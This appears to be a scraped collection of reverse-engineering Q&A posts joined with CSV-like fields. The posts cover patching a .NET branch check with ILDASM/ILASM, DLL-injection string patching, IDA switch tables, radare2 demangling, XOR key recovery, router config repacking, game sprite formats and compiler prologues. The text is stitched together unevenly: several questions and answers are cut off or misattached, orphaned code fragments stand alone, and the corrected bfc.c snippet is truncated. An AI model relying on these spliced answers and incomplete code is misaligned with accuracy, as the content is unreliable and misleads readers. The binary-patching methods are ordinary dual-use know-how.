<p>When I debug it with <a href=""http://x64dbg.com/#start"" rel=""nofollow"">x64dbg</a>, I'm trying to find the location of the <code>value.Equals(""No"", StringComparison.OrdinalIgnoreCase)</code> comparison, but I am having trouble finding a way to trace the application to its button click event. Ideally, I want to use x64dbg to modify my application's executable and have it run the <code>else</code> statement and print <code>""Well done, lad.""</code> instead. How can this be achieved?</p>

<p>In my Symbols window, under the <code>applicationtest.exe</code> symbol, I see <code>Button_Click</code> at a particular address, but when I try to set breakpoints in or around here in the <code>Disassembler</code> view it never hits them when I click the actual button.</p>
","<p><strong>Modifying a Release-Mode .NET Assembly</strong></p>

<p>Since IL is so simple, one way to achieve the same result without a debugger is to simply decompile the executable using ILDASM on a corresponding <strong>.NET release mode x64 executable</strong> using the following command line command:</p>

<pre><code>""C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools\ildasm.exe"" ApplicationTest.exe /out:Disassembly.asm
</code></pre>

<p>In the disassembly, you will see the following IL instructions under the <code>Button_Click</code> method:</p>

<pre><code>IL_000d:  callvirt   instance bool [mscorlib]System.String::Equals(string,
                                                                       valuetype [mscorlib]System.StringComparison)
    IL_0012:  brfalse.s  IL_0020

    IL_0014:  ldstr      ""You cannot proceed.""
</code></pre>

<p>It's very verbose and looks almost identical to your original .NET code so it makes it really easy to find the location of your corresponding code. Modify the text <code>brfalse</code> to be <code>brtrue</code>, and compile it using ILASM:</p>

<pre><code>""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"" Disassembly.asm
</code></pre>

<p>The result will be an assembly named <code>Disassembly.exe</code> which is nearly identical to the original assembly except that it has rerouted application logic. Now when you execute it, clicking the button will print <code>Well done, lad.</code>.</p>

<p><strong>Note</strong>: You may need to download the Windows SDK or corresponding .NET Framework your .NET project is running in order to get access to ILDASM or ILASM. Also, these tools may not work if your .NET application uses a different version of the .NET framework than the .NET versions that the version of ILDASM or ILASM you are using target.</p>

<p><strong>Debugging a Release-Mode .NET Assembly's MSIL Assembly Code Line-by-Line</strong></p>

<p>To directly answer the question, you can debug release-mode .NET assemblies line by line. You first need to decompile any .NET assembly into IL code as I have shown above, using ildasm. Then, you can recompile your assembly in ilasm using the <code>/pdb</code> flag (<code>ilasm Disassembly.asm /pdb</code>) to create a debug database that will let you debug any .NET assembly line by line. Here is a simple demonstration of how to do that. Once you have compiled using <code>ilasm Disassembly.asm /pdb</code>, launch the executable (<code>Disassembly.exe</code>). In Visual Studio, go to <code>Tools -&gt; Attach to process</code> and attach the debugger to <code>Disassembly.exe</code>. Once attached, go to <code>Debug -&gt; Options and Settings -&gt; Debugger -&gt; Symbols</code> and make sure you add the location of the folder hosting the <code>Disassembly.pdb</code> file (it should be the same folder that <code>Disassembly.exe</code> is in if you followed this guide correctly thus far. Hit the pause button in Visual Studio to freeze execution and go to <code>Debug -&gt; Windows -&gt; Threads</code> and view your threads. Navigate through the threads by double clicking on them. You may need to disable <code>Just my code</code>. If it prompts you, go ahead and do it, it should be a single click in the thread view. Eventually, you will see that one of your threads shows you the IL <code>Disassembly.asm</code>. You can add breakpoints in and debug it line by line. Here is a screenshot:</p>

<p><img src=""https://i.stack.imgur.com/DKTor.png"" alt=""enter image description here""></p>

<p>Just a quick note, you may need to resume then freeze again after loading symbols so that Visual Studio synchronizes them. Also, for this to work, you will need the corresponding <code>Disassembly.asm</code> file in the same directory as well.</p>

<p>Also, Visual Studio has a handy Disassembly View (<code>Debug -&gt; Windows -&gt; Disassembly</code>) which shows you the machine instructions generated by JIT instead of IL instructions, but this window you cannot debug, presumably because JIT generates this stuff dynamically.</p>

"Identify Jump Statements due to Switch/Case in IDA Pro","916","","<p>I want to identify the jump statements due to switch/case in an IDA Pro disassembled binary. My ultimate goal is to read the jump table entries. I am also interested in function table/vtables. For switch/case, I see the jump statements as:</p>

<ol>
<li><p><code>jmp  ds:off_20B280CC[ebx*4]</code></p></li>
<li><p><code>jmp  dword ptr ds:loc_6B2A825C[ecx*4]</code> [Q: Is it due to switch/jump?]</p></li>
</ol>

<p>The operand types of these jumps, as I see from <code>GetOperandValue(inst.ea, 0)</code>, are ""Memory Reference"" (type value 2). The jump statements like <code>jb short loc_6B2A8154</code> has operand type ""Immediate Near Address"" (type value 7). However, the jump statements like <code>jmp ds:__imp_memset</code> in the thunk functions to call imported functions also have the operand type ""Memory Reference"". </p>

<p>Is there any way I can distinguish between jump statements for switch/case and thunk functions? </p>
","<p>In many cases, IDA already knows that a jump is part of a jump-table and probably the result of a switch. When this is true, you can access it using IDAPython.</p>

<p>The relevant functions are <code>get_switch_info_ex(ea)</code> and <code>get_switch_info_ex(ea)</code>.
Looking in <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/ida_xref-module.html#calc_switch_cases"" rel=""nofollow"">IDAPython's documentation</a>, we find:</p>

<blockquote>
  <p>calc_switch_cases(insn_ea, py_swi)</p>
  
  <p>Get information about a switch's cases.</p>
  
  <p>The returned information can be used as follows:</p>

<pre><code>for idx in xrange(len(results.cases)):
    cur_case = results.cases[idx]
    for cidx in xrange(len(cur_case)):
        print ""case: %d"" % cur_case[cidx]
    print ""  goto 0x%x"" % results.targets[idx]
</code></pre>
  
  <p>@param insn_ea: address of the 'indirect jump' instruction @param si:
  switch information</p>
  
  <p>@return: a structure with 2 members: 'cases', and 'targets'.</p>
  
  <p>Returns: cases_and_targets_t</p>
</blockquote>

<p>To get the <code>results</code> variable from the example, we use the following code:</p>

<pre><code>si = idaapi.get_switch_info_ex(ea)
results = idaapi.calc_switch_cases(ea, si)
if not results:
    print ""No switch related jump at 0x{:X}"".format(ea)
</code></pre>

<p>So to check if an instruction is a switch or not, you can use the following function:</p>

<pre><code>def is_switch(ea):
    si = idaapi.get_switch_info_ex(ea)
    results = idaapi.calc_switch_cases(ea, si)
    return bool(results)
</code></pre>

<p>If you wish to use it, I've written a basic wrapper class for IDA's switch in Sark. <a href=""https://github.com/tmr232/Sark/blob/master/sark/code/switch.py"" rel=""nofollow"">See here</a>.</p>

"Demangle c++ functions in radare2","915","","<p>I am learning radare2. Is there a way to demangle c++ functions during disassembling? For example in gdb</p>

<p>edit:
I had radare2 0.9.6 which comes with Ubuntu's synaptic package manager. I reinstalled it from <a href=""https://github.com/radare/radare2"" rel=""nofollow"">https://github.com/radare/radare2</a>. Now I see the <code>asm.demangle</code> variable after entering <code>Ve</code>, it is set to true, but names are still mangled.</p>
","<p>Check <code>e asm.demangle</code>, and set it to true or false as required.</p>

<p>Is the radare2 version you are using the latest one?</p>

<p>You should be able to view all the configuration data with <code>e</code>.</p>

<p>Typing <code>e??</code> should show you a complete list of configuration variables with their description. You can grep through the output for all the vars that have the pattern <em>demangle</em> with</p>

<pre>
[0x00001d52]> e??~demangle
        asm.demangle: Show demangled symbols in disasm
        bin.demangle: Import demangled symbols from RBin
            bin.lang: Language for bin.demangle
[0x00001d52]>
</pre>

<p>Radare2 needs to be told to load the demangle informations at startup, so you can set <code>bin.demangle</code> to <code>true</code>, and reopen the file:</p>

<pre><code> e bin.demangle = true
 oo 
</code></pre>

<p>Last but not least, you can provide a symbol name in its mangled form on a case by case basis, using the command <code>iD</code>:</p>

<pre><code>[0x7c810705]&gt; iD cxx _ZNSo3putEc
std::ostream::put
[0x7c810705]&gt;
</code></pre>

<p>By the way, a tip instead of asking a question here and waiting forever:
radare2 is self documented, so you can begin by typing <code>?</code> to get help, and then append <code>?</code> to each command, like <code>a?</code>, or <code>pd?</code> and so on…</p>

"Patching a string using DLL injection and OllyDbg","915","","<p>I'm a novice when it comes to RE but I'm trying to get into it. I have a background in C/C++ so doing the development side of things should be a breeze (aside from when assembly has to be used, im rusty there). I just need to be pointed in the right direction with RE things and will be able to pick things up from there. </p>

<p>I wrote a simple CLI program (HackMe.exe) to practice RE with, using OllyDbg. It just has a string(""change me"") which I'm attempting to change (patch?) via a DLL.</p>

<p>Here's the CLI prog source</p>

<pre><code>#include &lt;iostream&gt;

#include &lt;Windows.h&gt;

int main(int argc, char** argv) {
    char* change_me = ""change me"";

    while(true) {
        std::cout &lt;&lt; change_me &lt;&lt; std::endl;
        Sleep(3000);
    }

    return 0;
}

        }
    }

    return TRUE;

    // patching code will go here
}

<p>So far what I've done is</p>

<ul>
<li>Attached OllyDbg to running HackMe.exe process</li>
<li>Searched for all referenced text strings and followed the ""change me"" string</li>
</ul>

<p>Following the the string brought me to where the string was found</p>

<p>So correct me if I'm wrong or not including something but I believe I need to</p>

<ul>
<li>Find the base address of the process and the offset to the string address</li>
<li>Patch the memory at base + offset with a new string thats len is == to the original </li>
</ul>

<p><strong>So i guess my questions are</strong></p>

<ol>
<li>How do I find the base offset of process (I assume I can do in the DLL using something like GetModuleHandle(""HackMe.exe""))? </li>
<li>Is there a way to see the base offset in OllyDbg (not that useful I suppose since the base will more than likely change every time the exe is ran)?</li>
<li>How do I find the +offset of the string from the base?</li>

<p>I have the implementation of crc64.
What I fail to understand is where does it get the seed from the data array for the getKey.</p>

<p>I'm not sure, I think it stores in the last 2 bytes the key that is used to generated the bigger key for xor. Please help, I'm really struggling and my C skills are a rusty.</p>

<p>Here is a set of data :</p>

<pre><code>$type = ""01"";
$length = ""37"";
$data=""ea8bf72287a0af8aa65edf259a43"".
""e1d8a67f71bce448273199848e401b33"".
""da379966a12ce4442e31991b71bde449"".
""39bb907d71bce448cc"";
</code></pre>

<p>Normally, first 8 bytes gives the latitude and second longitude which in this case is :
<code>f8869e63e888bb3f29ae997e0bc6e93f</code></p>

<p>So basically I assume we can expect this to be the coded version :
<code>ea8bf72287a0af8aa65edf259a43e1d8</code>
The inverse of xor is a xor so after xor it gives :
<code>120d69416f2814b58ff0465b918508e7</code></p>

<p>Which <em>hypothetically</em> is our partial xor key.</p>

<p>Now questions :</p>

<ul>
<li>what is the length of the seed stored in data?</li>
<li>how the xor key is computed?</li>
<li>are we sure about latitude/longitude position in data?</li>

<p>Here's your code with names given to most variables. That's quite a bit of code so I'll try to only iterate the important parts. I also added a few comments in the code to help reading, although I didn't try to cover all code with comments. Make sure you go over the named parameters, I believe those will help you understand the code quickly. Viewing the code in a syntax highlighting editor will also help (couldn't get SO to highlight).</p>

<p>the <code>NI</code> prefix is my initials, you can ignore it. </p>

<p>First, <code>doXor</code>:</p>

<p>This function simply XORs all bytes except the last byte, which is treated a bit differently, but more on that later. This is not part of the <code>while</code> loop simply because it's recevied differently in <code>doXor</code>. A possible reasoning behind this is to force any user of <code>doXor</code> to explicitly deal with this value, as it's somewhat important for asserting the validity of the decrpyed message.</p>

<p>This is never actually used, but generates a single byte of random data which is somewhat biased for sepcificaly the value 255 because casting a ""nonnegative long integer uniformly distributed between 0 and 2^31"" to a unsigned byte will, in most cases, yield a number above 255.</p>

<p>Third, <code>getKey</code>:</p>

<p><strong>[EDIT]</strong> A simple stream padding based on passed values. It is unclear what <code>crc64</code> does and how are it's parameters used, but it appears as if it does not receive a buffer.
The low dword returned from <code>crc64</code> is copied repeatedly to create the key sequence, and is used as the internal PRNG state. <code>crc64</code> is there for the function creating the initial state, or the seed function for <code>geyKey</code>.
It has some decompliation bloat (that is, extra redundant C statements caused by the decompiler not doing the best job it could) but basically this function fills the requested buffer with the same value over and over.</p>

</code></pre>

<p>Finally, sepcific answers to your questions:</p>

<ol>
<li>The length of the seed is a single byte, as generated in <code>getNumber</code> and used for key generation in <code>getKey</code>. It is used at <code>getKey</code> by expanding it and the other arguments calculated based on <code>v9_NI_unknown_plus_first_byte</code> to generate a <code>QWORD</code>.</li>
<li>For that you'll need to further RE the <code>crc64</code> function. Sorry about that. But understanding the <code>getKey</code> function better makes it possible to use another (more interesting) approach to decrypting streams of data. Since we now know the ""key"" is an 8byte sequeces used repeatedly, every known byte of the original message reveals all other bytes at the same 8byte offset. Messages with fixed headers, or known types of data (textual, for example) reveal a lot of information about the xor key.</li>
<li>I have no idea what's the actual content of the data, nor how to interpret it. That is required in order to validate the type and use. You should gather enough sample sets, decrypt them and see if they look like valid latitude/longitude values. </li>
</ol>

<p>I think the best way for you to proceed now is implementing a simulator that receives a message and tries to decrypt it using the information above. I may have made mistakes or overlooked some small details, but those will be eaier to identify by seeing errors in the produced decryption and following up on those.</p>

"Windbg: going from vftable to c++ class","907","","<p>As part of an assignment, I am delving into the world of Internet Explorer, and am trying to figure out exactly what class(es) are being allocated on the heap.</p>

<p>In the <code>mshtml!CEventObj::GenericGetElement()</code> method, the <code>eax</code> register points to an instance of a class, <code>edi</code> points to the object it references, and <code>esi</code> points to the vftable.</p>

<p>This being said, I inserted a breakpoint that would list these registers each time through the function, and they always point to the same vftable.</p>

<p>The vftable in question is <code>mshtml!CBodyElement</code>, but does this actually mean that all these instances are of the <code>CBodyElement</code>, or could they be for classes derived from <code>CBodyElement</code>. </p>

<p>If they are from derived classes, how do I determine the actual classes being allocated ?</p>
","<p>A derived class will get its own <code>vtable</code> if it overrides any of the virtual functions.</p>

<p>If the derived class does not override any virtual functions, it will use the original <code>vtable</code>.</p>

<p>I would say that your assumption is correct ~90% of the time.</p>

<p>The best that you can do for <em>static</em> type recovery, is to look at the <code>vtable</code> being used.</p>

<p>What you can do to help a bit is to turn one PageHeap with stack tracking (<code>gflags.exe /i iexplore.exe +hpa +ust</code>) and look at the address allocated for the object (<code>!heap -p -a 0xaddress</code>).  This will give you a full stack trace to the allocation-site of the object, which is sometimes to determine the type of object (e.g. if a <code>Factory</code> pattern was used).</p>

<p>Finally, there are additional dynamic analysis tricks you can play.  I wrote a Pin tool and IDA Python plugin, <a href=""https://github.com/zachriggle/ida-splode"" rel=""nofollow noreferrer"">ida-splode</a> for almost exactly this application.  By capturing information at runtime, you can enhance your IDA traces.  Below is an example screenshot from the slide deck.

I am planing on interfacing the typewriter with a Arduino and using it as a printer.</p>

<p>How do i determine things such as the baud rate, the pinout and the voltage. I already broke one typewriter trying to find out the protocol, I cannot get a owners manual for the typewriters, all of the other guides that i found involved modifying the circuit board and connecting the wires to the keys. I have not been able to find out how a a typewriter with a serial port works.</p>

<p>Next step would be using an Oscilloscope to determine the baud rate (and voltage). Often the oscilloscope software has some build in tools for automatically determining the baud rate. If not, you simple divide 1 by the <a href=""http://simple.wikipedia.org/wiki/Period_%28physics%29"">period</a> of the wave. E.g. find the 2 peaks with the shortest horizontal distance and measure that time to get the period.</p>

"Recognize the library functions of statically linked executable file in IDA Pro","902","","<p>Recently I worked on a Linux program which has all of its symbols stripped. Opening it with IDA resulted in none of its functions identified. </p>

<p>Thus I tried to extract any usable information from the executable file with the <code>strings</code> and <code>file</code> commands, but these sadly found nothing.</p>

<p>I know about the FLIRT technology in IDA, but it is based on knowing the version of the static library so it can use the correct signature file. In this case it seems we have no any version information for the used <code>glibc</code> or other libraries, so what should we do now?</p>

<pre><code>$ file stripped
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, stripped
</code></pre>

<p>With the outpuf of <code>file</code> as shown above, can I retrieve more details from this? Or is the solution that we can only recognize it via our experience?</p>
","<p>Short answer - No, there's no easy way to identity statically linked functions within an executable, other than manually reverse engineering the APIs or finding out which version if glibc exactly was used.</p>

<p>Unfortunately, using FLIRT might not prove useful even after you identify the exact glibc version. This is because actual instructions will be altered in the statically linking process. Some functions might be inlined if used rarely or are relatively short, for example. Advanced optimizations might make matter worse.</p>

<p>However, You could rather easily find <code>SYSENTER</code> (or <code>int 0x80</code> if using older versions of glibc/linux) instructions and map those to kernel callbacks. Obviously, a lot of API functionality is implemented without ever accessing the kernel, and that you'll need to work harder to recover. It is a possibility (depends on the linker's configuration when compiling the executable) that other glibc functions will be adjacent memory-wise, so finding a few statically linked APIs could help you recover others.</p>

<p>Last point of advice I could give you is to rename all functions you've identified as part of glibc appropriately, even without actually identifying their functionality, <code>glibcsub_*</code> or a similar easily recognizable pattern. I think you'll find this useful.</p>

"Does a JE must follow directly to an CMP?","899","","<p>I wanted to know if a jump instruction as <code>JE</code> must directly follow to a <code>CMP</code> instruction. Until now, I did always see that first a <code>CMP</code> comes and after that a <code>JMP</code>. But today I have discover the following:</p>

<pre><code>...
CMP DWORD PTR SS:[EBP+0xC], EAX
MOV ECX, DWORD PTR SS:[EBP+0x18]
PUSH ESI
MOV ECX, DWORD PTR SS:[EBP+0x18]
MOV DWORD PTR SS:[ECX],EAX 
MOV EAX, DWORD PTR SS:[EBP+0x10]
MOV DWORD PTR SS:[EDI], 0x1
JE SHORT crtdll.6C250E66
....
</code></pre>

<p>First of all, I am beginner. So, I try to understand the assembly language. Logically, I would say that the <code>JE</code> instruction is related to the <code>CMP</code> instruction at the beginning of that sequence. </p>

<p>So, my self-explanation was that we first compare, then do some <code>MOV</code> and <code>PUSH</code> operations, after that all we are jumping, is that right?</p>

<p>But, as I mentioned above, normally the jump comes in the next line after the comparison, could one say the reason for that late jump instruction here ? Or is it normal ?</p>
","<p>It is perfectly normal, compilers tend to emit such code for sake of optimization. </p>

<p>Moreover delaying the conditional jump is helpful for instruction prefetching &amp; branch handling. The code is valid too unless the code in between modify the EFLAGS register.</p>

"How can I figure out the device memory map for an embedded system?","897","","<p>On many embedded systems, a great deal of communication with devices is done by reading and writing to memory-mapped I/O (MMIO) addresses in software. Supposing that I have access to the physical device, and a copy of the firmware that I can load in IDA, how can I figure out which devices are at which addresses?</p>

<p>So far I've just been making guesses by looking at the code, string references (e.g., if a function prints out ""Initializing timer interrupt"" I can guess that maybe some of the addresses are for configuring a timer). But surely <em>something</em> must know where all the devices live in memory, because something is responsible for routing memory reads/writes to the correct device.</p>

<p>So, is there a more systematic way to derive this information?</p>
","<blockquote>
  <p>But surely something must know where all the devices live in memory, because something is responsible for routing memory reads/writes to the correct device.</p>
</blockquote>

<p>In embedded devices there's nothing like PCI (well, it may be present but it's just one of the many HW blocks). So you can't just scan all possibilities to discover the existing devices. The code must know where everything is.</p>

<p>That said, there are some sources of information you may try to find.</p>

<ol>
<li><p>Datasheets - always the best choice. Even if there are typos and c&amp;p errors it still beats anything else. Note that many manufacturers have separate <em>datasheets</em> for pinout, electrical/temperature characteristics of specific chips, and <em>user manuals</em> (also called software or programming manuals) which are shared among many chips in the same family. You usually need the latter, though sometimes the former can also give some useful hints.</p></li>
<li><p><em>Any</em> source code (OS, drivers, etc) you may find for the device. Even if it's not for the specific hardware block you're interested in, the headers may include defines for it.</p></li>
<li><p>If you can't find the exact match for your chip, look for anything in the same family - often the differences are just sizes of some blocks or number of ports.</p></li>
<li><p>Look at the docs for the same HW blocks in <em>any</em> chip of this manufacturer. Some makers reuse their IP blocks across architectures - e.g. Infineon used pretty much the same GPIO blocks in their E-GOLD (C166) and S-GOLD (ARM) basebands. Renesas is another example - they reused IP blocks from SuperH series in their ARM chips.</p></li>
<li><p>Some hardware is standardized across all architectures and manufacturers, e.g.: PCI, USB controllers (OHCI, EHCI, XHCI), SD host controllers, eMMC and so on.</p></li>
</ol>

<p><strong>EDIT</strong>: sometimes, the hardware <em>external</em> to chip may be connected via an <em>external bus interface</em> (or external memory interface, or many other names). This is usually present in the bigger chips with at least a hundred pins. This interface can be programmable, and you can set up which address ranges go to which set of pins. Often there are also so-called <em>chip select</em> (CS) lines involved, which allow multiplexing the same set of pins for accessing several devices, so that one range of addresses will assert CS1, the other CS2 and so on. If you have such a set up, you need to find out the code which initializes the external interface, or dump its configuration at runtime. If you can't do that, you can try looking for memory accesses which correspond to the register layout of the external chip (such as an Ethernet controller), modulo some base address in the CPU's address space.</p>

means I can only use one Lan at time and there's a <code>telnet</code> default user and password i cannot remove or change - well i can do but only provisory: <br> I was able to bypass the problem using telnet and busybox console but the fix is provisory unfortunately. Each time the router reboots the old config gets installed, wich is normal I think.</p>

Using binwalk i saw that there is 3 data blocks compressed with <code>zlib</code>. I made a quick and dirty script in python to unpack them and concatenate them in a <code>XML</code> file wich provides all the router's setup. </p>

<p><strong>I managed to modify and repack it, but here's the problem:</strong> the header contain some informations that make the config upgrade fail each time. With an hex editor I noticed that before each compressed <code>zlib</code> block there is the hex values of the pack inflated and deflated, so I was able to correct them. There's also in the header a <code>CRC32</code> of the concatenation of each <code>zlib</code> compressed packs without headers, so I was also able to correct it when I repack the new file. <br> But next to it there's what I believe is an other <code>CRC32</code>, but I can't find out what that <code>CRC32</code> is about so any help is welcome to this point. </p>

","<p>With the now free <a href=""https://www.zynamics.com/software.html"" rel=""nofollow"">BinDiff 4.2</a> you can do batch analysis with a bit of work.</p>

<p>In the BinDiff installation directory (<code>zynamics/BinDiff 4.2</code>), you will find <code>bin/differ.exe</code> and <code>bin/differ64.exe</code>. Those are binaries for batch diffing of IDBs and <code>.BinExport</code> files.</p>

<p>Once you have all your <code>.BinExport</code> files in one directory, run the original <code>differ.exe</code> command on that directory (give it the directory with the <code>.BinExport</code> files instead of the <code>.idb</code> files), and you'll get <code>.BinDiff</code> files for all possible diffs.

<ol>
<li><p>One is that it's simply a coding error and only the low half of the 32-bit register was initialized when the file was created.  If that's the case, then simply zeroing those two bytes should result in a successful decompression using the standard tool.</p></li>
<li><p>The other is that it's a (proprietary) modification to the normal LZ77 decompression, in which case, it's likely to be a minor enhancement rather than a completely new scheme.</p></li>
</ol>

<p>All of the samples of that camera's firmware that I was easily able to locate on the internet use the standard <code>00 00 00 09</code> tag, which may indicate that the first possibility is the more likely.</p>

<p>After checking with the binary you mentioned, it became clear that there was simply an error in the <code>bfc.c</code> file.  Specifically, around line 192 of <code>bfc.c</code> it says:</p>

<pre><code>if( command == 'd' )
{
    /* Read header */
    algo = ReadWord32( f );  /* Dummy */
    algo = ReadWord32( f );
    outsize = ReadWord32( f );
    insize -= 12;
}
</code></pre>

<p>However, this is incorrect because it fails to read the <code>infile</code> size as written in the header.  To quickly fix this, just change those lines to these and recompile:</p>

<pre><code>if( command == 'd' )
{
    /* Read header */
    algo = ReadWord32( f );  /* Dummy */
    algo = ReadWord32( f );

<p>When I do that, there is no problem decompressing the code.  To make the corresponding change to the output file (that is, compressing), change the code around line 364 of <code>bfc.c</code> from this:</p>

<pre><code>/* Write output file */
WriteWord32( outsize, f );
fwrite( out, outsize, 1, f );
fclose( f );
</code></pre>

<p>to this:</p>

<pre><code>/* Write output file */
fwrite( out, outsize, 1, f );
fclose( f );
</code></pre>

<p>I should probably mention the likely reason this change was done.  In the original program, the file size can be used to determine the size, but in an undifferentiated array of bytes (i.e. no file system) as is often the case in ROM, it is useful to encode both input and output files sizes within the header.</p>

<p>If you know of any online resources that could be helpfull, please let me know. I'm kind of lost at where to start. These are first couple of bytes from the file I'm trying to reverse engineer, maybe this will help:</p>

<p><img src=""https://i.stack.imgur.com/TQdJl.png"" alt=""hex dump of file""></p>

<p>The game is State of War. Its my childhoods' dream to write a remake of this game. I'm currently making a remake, but I'm using placeholder graphics. Thats why I need the sprites. I will not use it for commercial purposes.</p>

<p>There are 2 kinds of sprite files. *.tsp files, and a big sprites.data and sprites.info file. I've uploaded some files <a href=""http://www.filedropper.com/data_6"" rel=""nofollow noreferrer"">here</a>.</p>
","<p>You got started well; plotting unknown data as pixels immediately showed you this is indeed graphic data, not compressed (at least the buttons aren't), and in a usable RGB order. I guess the missing RGB format was what held you back; now you know it, you can write a simple program to plot in color and show offsets and widths of the images. Armed with that information, you can inspect the unknown bytes before (and possibly after) the images, and derive their meaning.</p>

<hr>

<h2>General overview</h2>

<p>The file <code>001_buttons.tsp</code> consists of a series of images, without a general file header but with a header per image.</p>

<p>The first long word of this header (4 bytes, little endian format) is the size of the following data in bytes, excluding the header itself (this length may be <code>0</code>). Then follow width and height as words. The next 12 bytes are 3 word-sized x,y pairs; the first pair is the center of the image. The coordinates are signed words, they wrap around at <code>0xFFFF/2</code>. The other pairs still serve an unknown purpose.</p>

<p>After that, you have (height) times the offset of the next image scan line in <em>words</em>, offset from the start by 4 (so 4+2*offset = next line).</p>

<p>Each scan line pointed to by these offsets is Run-Length Encoded (RLE) compressed. Transparent runs are indicated only by the number of horizontal pixels to skip; opaque runs can be copied directly to the screen. There is no alpha transparency in these images. Each scan line fills exactly <em>width</em> pixels after decompressing.</p>

<p>The pixel format is packed 16-bit RGB: <code>RRRR.RGGG.GGGB.BBBB</code>, which can be converted to 24-bit RGB in the following (not optimized) way:</p>

<pre><code>putpixel (x,y, (((val &gt;&gt; 8) &amp; 0xf8)&lt;&lt;16) | (((val &gt;&gt; 3) &amp; 0xfc)&lt;&lt;8) | ((val &amp; 0x1f)&lt;&lt;3) );
</code></pre>

<p>where <code>val</code> is simply the next word: <code>data[c]+(data[c+1]&lt;&lt;8)</code>.</p>

<p><img src=""https://i.stack.imgur.com/x17Vf.png"" alt=""sample dump""></p>

<hr>

<h2>Run-Length Encoding format</h2>

<p><img src=""https://i.stack.imgur.com/ComX6.png"" alt=""rle unpacked image""></p>

<p>All values mentioned hereafter are <em>word</em> sized (2 bytes, little endian).<br>
Each scan line starts with the <em>number of commands</em> for that line and a flag indicating whether to start with a ""skip"" or ""copy"". If the flag word after the number of commands is <code>0000</code>, the line starts with a ""skip"", and if it is <code>0001</code>, the line starts with a ""copy"".<br>
After that, ""skip"" and ""copy"" commands alternate until the entire scan line is filled. Each command is the number of pixels to skip or copy; for ""copy"", the actual pixel values follow directly after it.</p>

<p>All lines should be filled entirely -- if necessary, the command list ends with a number of 'empty' pixels to skip.</p>

<p><img src=""https://i.stack.imgur.com/bUS0Y.png"" alt=""new game overlay""></p>

<hr>

<p>Not all objects in <code>sprites.data</code> <em>are</em> sprites in this format. There are at least two different types:</p>

<ol>
<li><p>A monochrome mask object, using the same RLE compression scheme but without pixel data -- it contains only the length of each run. This could be to draw a mask, overlay a color, or aid in pixel-perfect object selection.</p></li>
<li><p>A list of signed word pairs of unknown use.</p></li>
</ol>

<p>Neither these objects nor the actual sprites have a recognizable identifier at the start, so you can only find out which is which by trial and error (for example: if the reported 'size' of an image is negative or larger than the entire data file, you know it cannot be an RLE-compressed image after all).</p>

<hr>

<h2>Sprite index file</h2>

<p>The index file <code>sprite.info</code> is obfuscated, but not by much. It has the following format:</p>

<pre><code>4 x some byte flag (all `01` in this file)
long  total number of objects (377, in this file)
377 x
      0-terminated ""filename"" (obfuscated)
      long offset in 'sprite.data'
      long length in 'sprite.data'
</code></pre>

<p>The filename is obfuscated by adding the constant <code>10</code> to each character. Decoding this, you get a list of 377 items:</p>

<pre><code>__extras\compplay.ps6                | 00000000 000000C0
__extras\dim1.ps6                    | 000000C0 00000BC4
__extras\dim2.ps6                    | 00000C84 00000EB4
...
units\tur_05_blue.ps6                | 01FAC346 00013E12
units\tur_05_gren.ps6                | 01FC0158 00013E12
units\turrets_shadow.ps6             | 01FD3F6A 00013C9C
</code></pre>

<p>This is some sort of general index, as clearly not all images are listed. It must list only the first of an animated set; the 'length' is then the total length of all files in that particular set. The file extensions are a hint to their contents: files ending with <code>.ps6</code> all contain at least one image (and may contain more), files ending with <code>.msk</code> are probably a monochrome mask and <code>.sha</code> possibly shadows. The <code>.po<em>digit</em></code> files contain coordinate pairs.</p>

"Understanding x86 C main function preamble created by Visual C++","883","","<p>I was debugging a simple x86-64 program in Visual Studio 2010 and I noticed that the <code>main</code> function preamble is different from the GNU GCC compiled version of the same C program.</p>

<p>The same disassembly is given by <code>objdump</code> version 2.22.90.20120924.</p>

<p>I realize that the first 3 instructions for both preambles do the following:</p>

<ol>
<li>Save old EBP (later needed to remove stack frame)</li>
<li>Top of old stack frame becomes EBP of new frame</li>
<li>Reserve space for local variables. The function has 3 integer local variables.</li>
</ol>

<p><strong>Question 1:</strong> What is the purpose of 4th instruction in the VC++ version? I see its saving EBX, but why? It never uses it afterwards.</p>

<p>For the remaining instructions of the VC++ version preamble, I relized that it initializes  <code>39h</code> dwords with the value <code>0CCCCCCCCh</code>. Which makes sense because <code>39h * 4h = 0E4h</code>.</p>

<p><strong>Question 2:</strong> Why is this space initialized with the value <code>0CCCCCCCCh</code>? Is this value better than <code>00000000h</code> in some way?</p>

<p><strong>Question 3:</strong> Why does the VC++ version allocate <code>0E4h</code> bytes for 3 local variables? Is this number random? If not, how is it computed?</p>

<p><strong>Question 4:</strong> Is this space used for something else beside local variables? If yes, for what?</p>
","<p>The extra space on the stack is there to support the Edit and Continue functionality and can be eliminated by changing /Zl to /Zi. The saved ebx and initialization of the stack to 0xcc is done by the <a href=""http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx"" rel=""nofollow noreferrer"">/RTC Runtime Checking Option</a>.</p>

<p>There was a <a href=""https://stackoverflow.com/questions/2077074/understanding-the-c-function-call-prolog-with-cdecl-on-windows"">similar question</a> asked on SO.</p>

<p>The windows example, by the way, is clearly a 32 bit binary. x64 windows calling convention uses RCX, RDX, R8, and R9 as the first 4 integer/pointer arguments (instead of the stack).</p>

"OllyDbg and XMM0 vs MM0 registers","880","","<p>How can I view the <code>XMM0</code>-<code>XMM7</code> registers within OllyDbg? I can right click on the registers window and go to <code>view MMX</code> registers, but I'm not exactly sure that these are the same. I see an instruction: <code>MOVSS DWORD PTR DS:[ESI+8],XMM0</code> and as step through that instruction, the value shown in <code>MM0</code> on the register window does not become the value stored at <code>[ESI+8]</code>.</p>

<p>So, I suppose another question is: <em>Are the <code>XMM0</code> and <code>MM0</code> registers different?</em></p>
","<p>To answer properly your question, yes. <code>xmm</code> registers were introduced by Intel with the <code>SSE</code> instruction set (IS) in 1999 with the Pentium III CPU. <code>SSE</code> stands for Streaming SIMD Extension and is a set of vector instructions. <code>xmm</code> registers are 128bit wide and can hold 4 <code>floats</code>, 2 <code>doubles</code>, or 16 <code>chars</code>. <code>SSE</code> can speed up signal processing applications (image processing, sound processing, compression, ...), encryption, and others quite dramatically when used properly. </p>

<p>On the other hand, <code>mm</code> registers are part of the <code>MMX</code> IS, another vector instruction set older than <code>SSE</code> (1997 I suppose), and are 64bit wide. 
